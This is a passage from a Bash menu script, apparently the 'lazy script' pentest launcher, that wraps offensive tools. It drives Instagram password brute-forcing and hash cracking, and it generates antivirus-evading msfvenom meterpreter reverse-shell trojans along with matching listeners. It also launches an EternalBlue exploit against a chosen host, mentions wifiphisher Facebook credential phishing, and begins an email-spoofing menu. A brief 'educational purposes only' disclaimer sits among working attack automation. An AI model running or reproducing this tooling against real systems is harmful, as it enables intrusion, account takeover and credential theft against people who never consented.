				echo -e "$TNI"
				read INSTALL
				if [[ "$INSTALL" = "install" ]]
				then
					install_yuki
				else
					continue
				fi
			fi
		elif [[ "$WEB" = 5 ]]
		then
			if [[ -d /root/Blazy ]]
			then
				cd /root/Blazy
				python blazy.py
				echo -e "$PAKTGB"
				$READAK
			else
				echo -e "$TNI"
				read INSTALL
				if [[ "$INSTALL" = "install" ]]
				then
					install_blazy
				else
					continue
				fi
			fi
		elif [[ "$WEB" = 6 ]]
		then
			if [[ -d /root/Striker ]]
			then
				cd /root/Striker
				python striker.py
				echo -e "$PAKTGB"
				$READAK
			else
				echo -e "$TNI"
				read INSTALL
				if [[ "$INSTALL" = "install" ]]
				then
					install_striker
				else
					continue
				fi
			fi
		elif [[ "$WEB" = 7 ]]
		then
			if [[ -d /root/hyprPulse ]]
			then
				cd /root/hyprPulse
				python pulsar.py
				echo -e "$PAKTGB"
				$READAK
			else
				echo -e "$TNI"
				read INSTALL
				if [[ "$INSTALL" = "install" ]]
				then
					install_hyprpulse
				else
					continue
				fi
			fi
		elif [[ "$WEB" = 8 ]]
		then
			if [[ -d /root/InstaBurst ]]
			then
				cd /root/InstaBurst
				python instagram.py
				echo -e "$PAKTGB"
				$READAK
			else
				echo -e "$TNI"
				read INSTALL
				if [[ "$INSTALL" = "install" ]]
				then
					install_instaburst
				else
					continue
				fi
			fi
		elif [[ "$WEB" = 9 ]]
		then
			if [[ -f /usr/local/bin/instagram-py ]]
			then
				while true
				do
					clear
					TERMINALTITLE="Instagram-py"
					dash_calc
					printf '\033]2;Instagram-py\a'
					echo -e " "$YS"1"$CE") New attack"
					echo -e " "$YS"2"$CE") Continue previous attack"
					echo -e " "$YS"3"$CE") View cracked passwords"
					echo -e " "$YS"4"$CE") Create configuration"
					echo -e " "$YS"b"$CE") Go back"
					read C
					clear
					if [[ "$C" == 1 ]]
					then
						echo -e ""$YS"Username: "$CE""
						read USRNM
						echo -e ""$YS"Wordlist path: "$CE""
						read WRDLST
						if [[ ! -f "$WRDLST" ]]
						then
							echo -e ""$RS"File not found"$CE""
							sleep 2
							continue
						fi
						instagram-py -vvv -u "$USRNM" -pl "$WRDLST"
						echo -e "$PAKTGB"
						$READAK
					elif [[ "$C" == 2 ]]
					then
						echo -e ""$YS"Username: "$CE""
						read USRNM
						echo -e ""$YS"Wordlist path: "$CE""
						read WRDLST
						if [[ ! -f "$WRDLST" ]]
						then
							echo -e ""$RS"File not found"$CE""
							sleep 2
							continue
						fi
						instagram-py -vvv -c -u "$USRNM" -pl "$WRDLST"
						echo -e "$PAKTGB"
						$READAK
					elif [[ "$C" == 3 ]]
					then
						echo -e ""$YS"Username: "$CE""
						read USRNM
						instagram-py -i "$USRNM"
						echo -e "$PAKTGB"
						$READAK
					elif [[ "$C" == 4 ]]
					then
						instagram-py -cc
						echo -e "$PAKTGB"
						$READAK
					elif [[ "$C" == "b" || "$C" == "back" ]]
					then
						clear
						break
					elif [[ "$C" == 0 ]]
					then
						clear
						exit
					elif [[ "$C" == 00 ]]
					then
						exec bash $0
					fi
				done
			else
				echo -e "$TNI"
				read INSTALL
				if [[ "$INSTALL" = "install" ]]
				then
					install_instagram-py
				else
					continue
				fi
			fi
		elif [[ "$WEB" = 10 ]]
		then
			if [[ -d /root/datasploit ]]
			then
				echo -e ""$YS"Domain: "$CE""
				read DMN
				cd /root/datasploit
				python datasploit.py -i "$DMN"
				echo -e "$PAKTGB"
				$READAK
			else
				echo -e "$TNI"
				read INSTALL
				if [[ "$INSTALL" = "install" ]]
				then
					install_datasploit
				else
					continue
				fi
			fi
		elif [[ "$WEB" = 11 ]]
		then
			if [[ -d /root/SiteBroker ]]
			then
				cd /root/SiteBroker
				python SiteBroker.py
				echo -e "$PAKTGB"
				$READAK
			else
				echo -e "$TNI"
				read INSTALL
				if [[ "$INSTALL" = "install" ]]
				then
					install_sitebroker
				else
					continue
				fi
			fi

		elif [[ "$WEB" = "" ]]
		then
			continue
		elif [[ "$WEB" = 0 ]]
		then
			exit
		elif [[ "$WEB" = 00 ]]
		then
			exec bash $0
		elif [[ "$WEB" = "back" || "$WEB" = "b" ]]
		then
			break
		fi
		#~ echo -e "$PAKTGB"
		#~ $READAK
	done
}
function other_tools
{
while true
do
	printf '\033]2;OTHER TOOLS\a'
	clear
	TERMINALTITLE="OTHER TOOLS"
	dash_calc
	if [[ -f /usr/bin/geany ]]
	then
		echo -e ""$YS" 1"$CE") Geany            Best notepad for linux"
	else
		echo -e ""$RS" 1"$CE") "$RS"Geany"$CE"            Best notepad for linux"
	fi
	if [[ -d /root/dagon ]]
	then
		echo -e ""$YS" 2"$CE") Dagon            Hash cracker/Advanced Hash Manipulation"
	else
		echo -e ""$RS" 2"$CE") "$RS"Dagon"$CE"            Hash cracker/Advanced Hash Manipulation"
	fi
	if [[ -d /root/LALIN ]]
	then
		echo -e ""$YS" 3"$CE") LALIN            Automatically install any package for pentest "
	else
		echo -e ""$RS" 3"$CE") "$RS"LALIN"$CE"            Automatically install any package for pentest "
	fi
	if [[ -d /root/cupp ]]
	then
		echo -e ""$YS" 4"$CE") Cupp             Make specific worldlists"
	else
		echo -e ""$RS" 4"$CE") "$RS"Cupp"$CE"             Make specific worldlists"
	fi
	if [[ -d /root/cupp ]]
	then
		echo -e ""$YS" 5"$CE") Bleachbit        Free up space"
	else
		echo -e ""$RS" 5"$CE") "$RS"Bleachbit"$CE"        Free up space"
	fi
	if [[ -d /root/Hash-Buster ]]
	then
		echo -e ""$YS" 6"$CE") Hash Buster      Hash cracker"
	else
		echo -e ""$RS" 6"$CE") "$RS"Hash Buster"$CE"      Hash cracker"
	fi
	if [[ -d /root/patator ]]
	then
		echo -e ""$YS" 7"$CE") Patator          Bruteforcer"
	else
		echo -e ""$RS" 7"$CE") "$RS"Patator"$CE"          Bruteforcer"
	fi
	echo -e ""$YS" b"$CE") Go back"
	echo -e ""$YS" 0"$CE") EXIT"
	echo -e "Choose: "
	read -e OTHERT
	clear
	if [[ "$OTHERT" = 1 ]]
	then
		if [[ -f /usr/bin/geany ]]
		then
			geany
		else
			echo -e "$TNI"
				read INSTALL
				if [[ "$INSTALL" = "install" ]]
				then
					install_geany
				else
					continue
				fi

		fi
	elif [[ "$OTHERT" = 2 ]]
	then
		if [[ -d /root/dagon ]]
		then
			dagon_script
		else
			echo -e "$TNI"
				read INSTALL
				if [[ "$INSTALL" = "install" ]]
				then
					install_dagon
				else
					continue
				fi

		fi
	elif [[ "$OTHERT" = 3 ]]
	then
		if [[ -d /root/LALIN ]]
		then
			cd /root/LALIN
			./Lalin.sh
			cd
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_lalin
			else
				continue
			fi
		fi
	elif [[ "$OTHERT" = "4" ]]
	then
		if [[ -d "/root/cupp" ]]
		then
			cd /root/cupp
			python cupp.py -i
			cd		
			echo -e "$PAKTGB"
			$READAK	
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_cupp
			else
				continue
			fi
		fi
	elif [[ "$OTHERT" = "5" ]]
	then
		if [[ -f "/usr/bin/bleachbit" ]]
		then
			bleachbit		
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_bleachbit
			else
				continue
			fi
		fi
	elif [[ "$OTHERT" = "6" ]]
	then
		if [[ -d "/root/Hash-Buster" ]]
		then
			cd /root/Hash-Buster
			python hash.py	
			echo -e "$PAKTGB"
			$READAK	
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_hashbuster
			else
				continue
			fi
		fi
	elif [[ "$OTHERT" = "7" ]]
	then
		if [[ -d "/root/patator" ]]
		then
			patator_automation
			echo -e "$PAKTGB"
			$READAK	
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_patator
			else
				continue
			fi
		fi
	elif [[ "$OTHERT" = 00 ]]
	then
		clear
		exec bash $0
	elif [[ "$OTHERT" = "back" || "$OTHERT" = "b" ]]
	then
		break
	elif [[ "$OTHERT" = 0 ]]
	then
		clear
		exit
	fi
done
}
function findsploit_menu
{
	clear
	echo -e "Search: "
	read FSEARCH
	findsploit "$FSEARCH"
	echo -e "$PAKTGB"
	$READAK
}
function metasploit_menu
{
	if [[ ! -d "$LPATH"/rc ]]
	then
		mkdir "$LPATH"/rc
	fi
	while true
	do
	clear
	TERMINALTITLE="METASPLOIT"
	dash_calc
	printf '\033]2;METASPLOIT\a'
	echo -e ""$YS" 1"$CE") Create payload with msfvenom"
	echo -e ""$YS" 2"$CE") Create listener"
	echo -e ""$YS" 3"$CE") Saved listeners"
	echo -e ""$YS" 4"$CE") Start msfconsole"
	echo -e ""$YS" 5"$CE") Update msfconsole"
	echo -e ""$YS" 6"$CE") Armitage"
	echo -e ""$YS" 7"$CE") Findsploit"
	echo -e ""$YS" b"$CE") Go back"
	echo -e ""$YS" 0"$CE") EXIT"
	echo -e "Choose: "
	read -e METASP
	clear
	if [[ "$METASP" = "1" ]]
	then
		PAYLOADL=""
		echo -e "PAYLOAD (Default: "$YS"windows/meterpreter/reverse_tcp"$CE"): "
		read PAYLOADL
		if [[ -z "$PAYLOADL" ]]
		then
			echo -e "Setting PAYLOAD to windows/meterpreter/reverse_tcp"
			sleep 2
			PAYLOADL="windows/meterpreter/reverse_tcp"
		fi
		echo -e "LHOST: "
		read ATIP
		echo -e ""
		echo -e "LPORT: "
		read ATPORT
		echo -e ""
		echo -e "Enter the target's architecture("$YS"x86"$CE"/"$YS"x64"$CE"): "
		read TARCH
		echo -e "Enter the name of the payload(e.g: "$YS"trojan2"$CE"): "
		read ATEXE
		ATEXEPATH="/root/Desktop/$ATEXE.exe"
		clear
		echo -e "Generating"
		sleep 0.1
		echo .
		sleep 0.1
		echo .
		sleep 0.1
		echo .
		sleep 0.1
		echo .
		sleep 0.1
		echo .
		sleep 0.1
		echo .
		if [[ "$TARCH" = "x64" ]]
		then
			msfvenom -p $PAYLOADL --platform windows -a x64 -f exe -e x86/shikata_ga_nai LHOST="$ATIP" LPORT="$ATPORT" -o "$ATEXEPATH"
		else
			msfvenom -p $PAYLOADL --platform windows -a x86 -f exe -e x86/shikata_ga_nai LHOST="$ATIP" LPORT="$ATPORT" -o "$ATEXEPATH"
		fi
		echo -e "Done."
		echo -e ""
		echo -e "$PAKTC"
		$READAK
		clear
		echo -e "Create a listener for this payload? $YNYES "
		read PAYL
		if [[ "$PAYL" != "n" ]]
		then
			echo -e "Name of listener(e.g: "$YS"john"$CE") : "
			read NAMEL
			echo "use exploit/multi/handler" > "$LPATH"/rc/"$NAMEL".rc
			echo "set PAYLOAD $PAYLOADL " >> "$LPATH"/rc/"$NAMEL".rc
			echo "set LHOST $ATIP " >> "$LPATH"/rc/"$NAMEL".rc
			echo "set LPORT $ATPORT " >> "$LPATH"/rc/"$NAMEL".rc
			echo "set ExitOnSession false" >> "$LPATH"/rc/"$NAMEL".rc
			echo "exploit -j" >> "$LPATH"/rc/"$NAMEL".rc
			clear
			echo -e "Launch the listener now? "$YNONLY""
			read LLN
			if [[ "$LLN" = "y" ]]
			then
				echo -e "Launching msfconsole..."
				sleep 2
				clear
				msfconsole -r "$LPATH"/rc/"$NAMEL".rc
			fi
		fi
	elif [[ "$METASP" = "z" ]]
	then
		clear
		echo -e "CAUTION: DO NOT upload it to anti-virus scanners online."
		sleep 3
		echo -e "You agree with that?("$YS"YES"$CE"/"$YS"*"$CE")"
		read MUSTBEYES
		if [[ "$MUSTBEYES" = "YES" ]] 
		then 
			clear
			cd /root/zirikatu
			./zirikatu.sh
		fi
	elif [[ "$METASP" = "2" ]]
	then
		clear
		echo -e "LHOST: "
		read LHOSTL
		echo -e "LPORT: "
		read LPORTL
		echo -e "PAYLOAD (Default: "$YS"windows/meterpreter/reverse_tcp"$CE"): "
		read PAYLOADL
		if [[ -z "$PAYLOADL" ]]
		then
			echo -e "Setting PAYLOAD to windows/meterpreter/reverse_tcp"
			sleep 2
			PAYLOADL="windows/meterpreter/reverse_tcp"
		fi
		echo -e "Name of listener(e.g: "$YS"john"$CE") : "
		read NAMEL
		echo "use exploit/multi/handler" > "$LPATH"/rc/"$NAMEL".rc
		echo "set PAYLOAD $PAYLOADL " >> "$LPATH"/rc/"$NAMEL".rc
		echo "set LHOST $LHOSTL " >> "$LPATH"/rc/"$NAMEL".rc
		echo "set LPORT $LPORTL " >> "$LPATH"/rc/"$NAMEL".rc
		echo "set ExitOnSession false" >> "$LPATH"/rc/"$NAMEL".rc
		echo "exploit -j" >> "$LPATH"/rc/"$NAMEL".rc
		clear
		echo -e "Launch the listener now? "$YNONLY""
		read LLN
		if [[ "$LLN" = "y" ]]
		then
			echo -e "Launching msfconsole..."
			sleep 2
			clear
			msfconsole -r "$LPATH"/rc/"$NAMEL".rc
		fi
	elif [[ "$METASP" = "3" ]]
	then
		while true
		do
		clear
		ls -w 1 "$LPATH"/rc
		echo -e ""
		echo -e ""
		echo -e "Enter the name of the listener you want to select(e.g: "$YS"john"$CE")"
		echo -e ""$YS" r"$CE") Delete all saved listeners"
		echo -e ""$YS" b"$CE") Go back"
		read NAMERC
		clear
		if [[ "$NAMERC" = "back" || "$NAMERC" = "b" ]]
		then
			break
		elif [[ "$NAMERC" = "reset" || "$NAMERC" = "r" ]]
		then
			rm -f "$LPATH"/rc/*
			continue
		fi
		if [[ ! -f "$LPATH"/rc/"$NAMERC" ]]
		then
			NAMERC="$NAMERC".rc
			if [[ ! -f "$LPATH"/rc/"$NAMERC" ]]
			then
				echo -e "File not found. Try again.."
				sleep 2
				continue
			fi
		fi
		while true
		do
		clear
		echo -e ""$NAMERC" selected."
		echo -e ""$YS" 1"$CE") Start listener"
		echo -e ""$YS" 2"$CE") Delete listener"
		echo -e ""$YS" b"$CE") Go back"
		echo -e "Choose: "
		read LISTL
		if [[ "$LISTL" = "1" ]]
		then
			msfconsole -r "$LPATH"/rc/"$NAMERC"
		elif [[ "$LISTL" = "2" ]]
		then
			rm "$LPATH"/rc/"$NAMERC"
			break
		elif [[ "$LISTL" = "back" || "$LISTL" = "b" ]]
		then
			break
		fi
		done
		done
	elif [[ "$METASP" = "4" ]]
	then
		msfconsole
	elif [[ "$METASP" = "5" ]]
	then
		msfupdate
	elif [[ "$METASP" = "6" ]]
	then
		service postgresql start
		armitage
		clear
	elif [[ "$METASP" = "7" ]]
	then
		findsploit_menu
	elif [[ "$METASP" = "back" || "$METASP" = "b" ]]
	then
		BACKL="1"
		break
	elif [[ "$METASP" = "00" ]]
	then
		exec bash "$0"
	elif [[ "$METASP" = "0" ]]
	then
		clear
		exit
	fi
	done
}
function update_lscript
{
	echo -e "Checking for updates..."
	TESTINTERNETCONNECTION=$(curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//')
	if [[ "$TESTINTERNETCONNECTION" != "" ]]
	then
		VER=$(timeout -s SIGTERM 20 curl "https://raw.githubusercontent.com/arismelachroinos/lscript/master/version.txt" 2>/dev/null)
		if [[ "$VERSION" != "$VER" ]]
		then
			clear
			echo -e "There is an update available."
			echo -e "Current version: $VERSION"
			echo -e "Updated version: $VER"
			echo -e "$PAKTC"
			$READAK
			clear
			echo -e "Do you want to update?"$YNONLY": "
			read UPDATEYN
			if [[ "$UPDATEYN" = "y" ]]
			then
				clear
				#~ echo -e "Making new directory for the old lscript (will pass it to /root/lscriptold)"
				sleep 1
				if [[ -d /root/lscriptold ]]
				then
					rm -r /root/lscriptold
				fi
				mkdir /root/lscriptold
				echo -e ""
				#~ echo -e "Moving lscript to lscriptold"
				sleep 1
				mv "$LPATH" /root/lscriptold
				#~ echo -e "Cloning the latest github version to new "$LPATH""
				sleep 1
				cd
				git clone https://github.com/arismelachroinos/lscript.git
				cd "$LPATH"
				chmod +x install.sh
				clear
				sleep 1
				if [[ -f /root/lscriptold/lscript/IAGREE.txt ]]
				then
					cp /root/lscriptold/lscript/IAGREE.txt "$LPATH"
				fi
				if [[ -d /root/lscriptold/lscript/ks ]]
				then
					echo -e "Copying your shortcuts"
					cp -r /root/lscriptold/lscript/ks "$LPATH"
					echo -e "Done."
					sleep 0.2
				fi
				if [[ -d /root/lscriptold/lscript/settings ]]
				then
					echo -e "Copying your settings"
					cp -r /root/lscriptold/lscript/settings "$LPATH"
					echo -e "Done."
					sleep 0.2
				fi
				if [[ -f /root/lscriptold/lscript/wlanmon.txt ]]
				then
					echo -e "Copying your interfaces"
					cp /root/lscriptold/lscript/wlanmon.txt "$LPATH"
					echo -e "Done."
					sleep 0.2
				fi
				echo -e ""
				if [[ -f /root/lscriptold/lscript/wlan.txt ]]
				then
					cp /root/lscriptold/lscript/wlan.txt "$LPATH"
					echo -e "Done."
					sleep 0.2
					clear
				fi
				echo -e "$PAKTC"
				$READAK
				cd "$LPATH"
				gnome-terminal -e ./install.sh
				clear 
				sleep 1
				rm -rf /root/lscriptold
				echo -e "Exiting..."
				sleep 1
				kill -9 $PPID
			else 
				clear
				echo -e "You didnt select "y" so you go back..."
				sleep 3
				exec bash "$0"
			fi
		else
			echo -e "There is no update available"
			sleep 1
			echo -e "Installed version: $VERSION"
			sleep 1
			echo -e "Github version:    $VER"
			sleep 1
			echo -e "$PAKTGB"
			$READAK	
			exec bash "$0"
		fi
	else
		clear
		echo -e "There is no connection."
		sleep 1
		echo -e "Maybe you should type 'stop' in the main manu to gain internet access again"
		echo -e ""
		echo -e "$PAKTGB"
		$READAK
		exec bash "$0"
	fi	
}
function hidden_shortcuts
{
	clear
	TERMINALTITLE="HIDDEN SHORTCUTS"
	dash_calc
	printf '\033]2;HIDDEN SHORTCUTS\a'
	echo -e ""$YS"  interface"$CE") Change your interface"
	echo -e ""$YS"     wififb"$CE") Create open wifi access point and get fb passwords with wifiphisher"
	echo -e ""$YS"eternalblue"$CE") Launch msfconsole with eternalblue exploit on target"
	echo -e ""$YS"  etercheck"$CE") Check if a target is vulnerable to eternalblue exploit"
	echo -e ""$YS"  changelog"$CE") View the changelog of the lscript versions"
	echo -e ""$YS"     pstart"$CE") Service postgresql start"
	echo -e ""$YS"      pstop"$CE") Service postgresql stop"
	echo -e ""$YS"     nstart"$CE") Service network-manager start"
	echo -e ""$YS"      nstop"$CE") Service network-manager stop"
	echo -e ""$YS"     astart"$CE") Service apache2 start"
	echo -e ""$YS"      astop"$CE") Service apache2 stop"
	echo -e ""$YS"nessusstart"$CE") Start Nessus"
	echo -e ""$YS" nessusstop"$CE") Stop Nessus"
	echo -e "$PAKTGB"
	$READAK
	clear
}
function one_time_per_launch_ks
{
	if [[ -d ""$KSPATH"/nums" ]]
	then
		rm -r "$KSPATH"/nums
	fi
	mkdir "$KSPATH"/nums
	nn=1
	ff=1
	HOWMANY=0
	HOWADD=$(( HOWMANYTOOLS + 1 )) 
	while [[ "$nn" != "$HOWADD" ]]
	do
		listshortcuts
		if [[ -f ""$KSPATH"/"$TITLE"/"$TITLE"ks.txt" ]]
		then
				echo -e "$TITLE" > "$KSPATH"/nums/"$ff".txt
				ff=$(( ff+1 ))
				HOWMANY=$(( HOWMANY+1 ))		
		fi
		nn=$(( nn+1 ))

	done
	ONETIMEPERLAUNCH="1"
}
function interface_menu
{
	WLANN=$(cat "$LPATH"/wlan.txt)
	WLANNM=$(cat "$LPATH"/wlanmon.txt)
	echo -e "Your current wireless interface names are $WLANN and $WLANNM"
	sleep 2
	echo -e "Do you want to change you interface names?"$YNYES": "
	read INAG
	if [[ "$INAG" = "n" ]]
	then
		clear
		echo -e "Then why did you come here? lol"
		sleep 3
		exec bash "$0"
	else
		clear
		rm "$LPATH"/wlan.txt
		rm "$LPATH"/wlanmon.txt
		set_interface_number
	fi
}
function tools_menu
{
	while true
	do
	clear
	TERMINALTITLE="TOOLS"
	dash_calc
	printf '\033]2;TOOLS\a'
	echo -e ""$YS" 1"$CE") Wifi tools"
	echo -e ""$YS" 2"$CE") Remote access"
	echo -e ""$YS" 3"$CE") Information gathering"
	echo -e ""$YS" 4"$CE") Webside tools"
	echo -e ""$YS" 5"$CE") Others"
	echo -e ""$YS" 6"$CE") Install/reinstall a tool"
	echo -e ""$YS" i"$CE") Info"
	echo -e ""$YS" b"$CE") Go back"
	#~ echo -e ""$YS"00"$CE") Main menu"
	echo -e ""$YS" 0"$CE") EXIT"
	echo "Choose: "
	read -e CATEG
	clear
		if [[ "$CATEG" = "1" ]]
		then
			wifi_tools
		elif [[ "$CATEG" = "2" ]]
		then
			remote_access
		elif [[ "$CATEG" = "3" ]]
		then
			information_gathering
		elif [[ "$CATEG" = "4" ]]
		then
			website_tools
		elif [[ "$CATEG" = "5" ]]
		then
			other_tools
		elif [[ "$CATEG" = "6" ]]
		then
			NOCONFIRM=0
			reinstall_tools
			NOCONFIRM=0
		elif [[ "$CATEG" = "0" ]]
		then
			clear
			exit
		elif [[ "$CATEG" = "back" || "$CATEG" = "b" || "$CATEG" = 00 ]]
		then
			BACKL="1"
			break
		elif [[ "$CATEG" = "i" ]]
		then
			TERMINALTITLE="INFO"
			dash_calc
			printf '\033]2;INFO\a'
			echo -e ""$LGYS"Wifi tools:"
			echo -e "	Mostly focused on network attacks, MITM, DoS, evil-twin and phishing."
			echo -e "Remote access:"
			echo -e "	Mostly focused on payload generation, listeners, exploits, scanners"
			echo -e "	and bypassing anti-virus software."
			echo -e "Information gathering:"
			echo -e "	Self-explained."
			echo -e "Other tools:"
			echo -e "	Some very usefull tools that don't fit to the other categories."
			echo -e "Install/reinstall a tool:"
			echo -e "	From here you can install any tool available in the lazy script."
			echo -e "	If it is already installed, it will be deleted and reistalled."$CE""
			echo -e ""
			echo -e ""$BS"Do you want another tool to be added in the script?"$CE""
			echo -e ""$BS"Submit it as an issue on my github repo:"$CE""
			echo -e "	"$YS"https://github.com/arismelachroinos/lscript"$CE""
			echo -e ""
			echo -e ""
			echo -e "$PAKTGB"
			$READAK
		fi
	done
}
function public_ip
{
	clear
	echo -e ""$BS"Please wait..."$CE""
	CHECKMON=$(ifconfig | grep "mon")
	if [[ "$CHECKMON" = "" ]]
	then
		clear
		PUBLICIP=$(curl -s ipinfo.io/ip)
		if [[ "$PUBLICIP" = "" ]]
		then
			PUBLICIP=$(curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//')
			if [[ "$PUBLICIP" = "" ]]
			then
				clear
				PUBLICIP="Connection error."
			fi
		fi
		echo "Your public IP is: "$PUBLICIP""
		#~ curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//'
	else
		echo -e "When monitor mode is enabled, you don't have internet access."
		echo -e "Select 'd2' to disable monitor mode"
		echo -e "$PAKTGB"
		$READAK
		clear
		exec bash "$0"
	fi
}
function terms_of_use
{
	printf '\033]2;TERMS OF USE\a'
	clear
	echo -e ""$RS"You need to accept the terms."$CE""
	sleep 1
	echo -e "$PAKTC"
	$READAK
	clear
	echo -e "This tool is only for educational purposes only."
	echo -e "Use this tool only on your own network and never without permission."
	echo -e "I am not responsible for anything you do with this tool."
	echo -e "Will you use this tool only on your own network and only with your own responsibility?("$YS"YES"$CE"/"$YS"NO"$CE"): "
	read YESORNO
	if [[ "$YESORNO" = "YES" ]]
	then 
		echo "You have agreed the terms and you use this tool with your own responsibility." > "$LPATH"/IAGREE.txt
		sleep 1
		clear
	else
		echo -e "You didn't type 'YES' , so you cannot continue"
		sleep 4
	fi
	exec bash "$0"
}
function eternalblue
{
	if [[ ! -d "$LPATH"/rce ]]
	then
		mkdir	"$LPATH"/rce
	fi
	EG=$(local_ips $WLANN)
	if [[ "$EG" != "" ]]
	then
		echo -e "LHOST: ("$YS""Enter""$CE"="$EG") "
	else
		echo -e "LHOST: "
	fi
	read LHOSTL
	if [[ "$EG" != "" && "$LHOSTL" = "" ]]
	then
		LHOSTL="$EG"
	fi
	echo -e "RHOST: "
	read RHOSTL
	echo -e "TARGETARCHITECTURE("$YS"x86"$CE"/"$YS"x64"$CE"): "
	read TARGETARCHL
	if [[ "$TARGETARCHL" = "x64" ]]
	then
		PROCESSINJECTL="lsass.exe"
		PAYLOADL="windows/x64/meterpreter/reverse_tcp"
	else
		PAYLOADL="windows/meterpreter/reverse_tcp"
	fi
	echo -e "TARGET("$YS"0"$CE"-"$YS"8"$CE"): "
	read TARGETL
	echo "use exploit/windows/smb/eternalblue_doublepulsar" > "$LPATH"/rce/eternalbluerc.rc
	echo "set LHOST "$LHOSTL"" >> "$LPATH"/rce/eternalbluerc.rc
	echo "set RHOST "$RHOSTL"" >> "$LPATH"/rce/eternalbluerc.rc
	echo "set PAYLOAD "$PAYLOADL"" >> "$LPATH"/rce/eternalbluerc.rc
	echo "set TARGET "$TARGETL"" >> "$LPATH"/rce/eternalbluerc.rc
	echo "set TARGETARCHITECTURE "$TARGETARCHL"" >> "$LPATH"/rce/eternalbluerc.rc
	echo "set PROCESSINJECT "$PROCESSINJECTL"" >> "$LPATH"/rce/eternalbluerc.rc
	echo "show info" >> "$LPATH"/rce/eternalbluerc.rc
	echo "exploit -j" >> "$LPATH"/rce/eternalbluerc.rc
	msfconsole -r "$LPATH"/rce/eternalbluerc.rc
	
}
function eternalblue_check
{
	if [[ ! -d "$LPATH"/rce ]]
	then
		mkdir	"$LPATH"/rce
	fi
	echo -e "RHOST:("$BS"if scanning multiple hosts, seperate with space"$CE") "
	read RHOSTL
	echo "use auxiliary/scanner/smb/smb_ms17_010" > "$LPATH"/rce/eternalbluerc.rc
	echo "set RHOSTS "$RHOSTL"" >> "$LPATH"/rce/eternalbluerc.rc
	echo "exploit" >> "$LPATH"/rce/eternalbluerc.rc
	echo -e ""$BS"Launching msfconsole. Please wait..."$CE""
	msfconsole -r "$LPATH"/rce/eternalbluerc.rc
	
}
function start_menu
{
	O1=0
	O2=0
	O3=0
	echo -e "Enabling $WLANNM..."
	enable_wlan
	echo -e "Killing services..."
	airmon-ng check kill &> /dev/null && echo -e ""$YS"Done"$CE"" && O1=1
	echo -e "Starting monitor mode..."
	if [[ "$ALFA" = "yes" ]]
	then
		ifconfig $WLANN down
		iwconfig $WLANN mode monitor &> /dev/null && echo -e ""$YS"Done"$CE"" && O2=1
		ifconfig $WLANN up
	else
		airmon-ng start $WLANN | grep "monitor mode" | awk -F "(" {'print $2'} | cut -d ')' -f1 &> /dev/null && echo -e ""$YS"Done"$CE"" && O2=1
	fi
	if [[ -f "$LPATH"/settings/startmac.txt ]]
	then
		read STARTMAC < "$LPATH"/settings/startmac.txt
	else
		STARTMAC="$DEFMAC"
	fi
	echo -e "Changing mac address of $WLANNM to "$STARTMAC"..."
	ifconfig $WLANNM down
	macchanger -m $STARTMAC $WLANNM &> /dev/null | grep "New MAC:" &> /dev/null && O3=1
	ifconfig $WLANNM up && echo -e ""$YS"Done"$CE"" 
	if [[ "$O1" = 1 && "$O2" = 1 && "$O3" = 1 && "$O4" = 1 ]]
	then
		BACKL=1
	fi
}
function stop_menu
{
	O1=0
	O2=0
	O3=0
	stop_monitor
	echo -e "Changing mac address of $WLANN to the original one..."
	ifconfig $WLANN down
	macchanger -p $WLANN | grep "Current MAC:" && O1=1
	ifconfig $WLANN up
	echo -e ""$YS"Done"$CE""
	if [[ "$O1" = 1 && "$O2" = 1 && "$O3" = 1 ]]
	then
		BACKL=1
	fi
}
function stop_monitor
{
	echo -e "Disabling $WLANNM..."
	echo -e "Stopping monitor mode..."
	if [[ "$ALFA" = "yes" ]]
	then
		A1=0
		A2=0
		A3=0
		ifconfig $WLANN down && A1=1
		iwconfig $WLANN mode managed && A2=1
		ifconfig $WLANN up && A3=1
		if [[ "$A1" = 1 && "$A2" = 1 && "$A3" = 1 ]]
		then
			echo -e ""$YS"Done"$CE"" && O2=1
		else
			echo -e ""$RS"Error stoping monitor mode."$CE""
		fi
	else
		airmon-ng stop $WLANNM &>/dev/null && echo -e ""$YS"Done"$CE"" && O2=1 || echo -e ""$RS"Error stoping monitor mode."$CE""
	fi
	echo -e "Starting network-manager service..."
	service network-manager start && echo -e ""$YS"Done"$CE"" && O3=1 || echo -e ""$RS"Error starting network-manager service"$CE""
}
function spoof_email
{
while true
do
	sm=0
	clear
	if [[ ! -d /bin/lscript/smtp ]]
	then
		mkdir /bin/lscript/smtp
	fi
	echo -e ""$RS"YOU SHOULD FIRST SIGN UP ON https://www.smtp2go.com AND VERIFY YOUR EMAIL."$CE""
	echo -e ""$RS"THEN GO TO https://app.smtp2go.com/settings/users AND MAKE A USERNAME AND PASS."$CE""
	echo -e ""$RS"      ########ALWAYS HAVE PERMISSION OF THE EMAILS YOU SPOOF########"$CE""
	echo -e ""$RS"      ########DONT SEND VIRUSES , PHISHING OR ILLEGAL THINGS########"$CE""
	if [[ ! -f /bin/lscript/smtp/smtpemail.txt ]]
	then
		echo -e ""$YS" 1"$CE") Set your SMTP username and pass     "$RS"NOT SET"$CE""
	else
		read smtpemail < /bin/lscript/smtp/smtpemail.txt
		echo -e ""$YS" 1"$CE") Set your SMTP username and pass     Current: "$YS""$smtpemail""$CE""
	fi
	echo -e ""$YS" 2"$CE") Send a spoofed email"
	echo -e ""$YS" 3"$CE") Clear your SMTP username and pass from lscript"
	echo -e ""$YS" 4"$CE") Fix email failed"
	echo -e ""$YS" b"$CE") Go back"
	echo -e ""$YS" 0"$CE") EXIT"
	read SMTP
	if [[ "$SMTP" = "1" ]]
	then
		clear
		echo -e "Enter your smtp username(find it here: https://app.smtp2go.com/settings/users ): "
		read SMTPEMAIL
		echo -e "Enter your smtp password(find it here: https://app.smtp2go.com/settings/users ): "
		read SMTPPASS
		clear
		echo "$SMTPEMAIL" > /bin/lscript/smtp/smtpemail.txt
		echo "$SMTPPASS" > /bin/lscript/smtp/smtppass.txt 
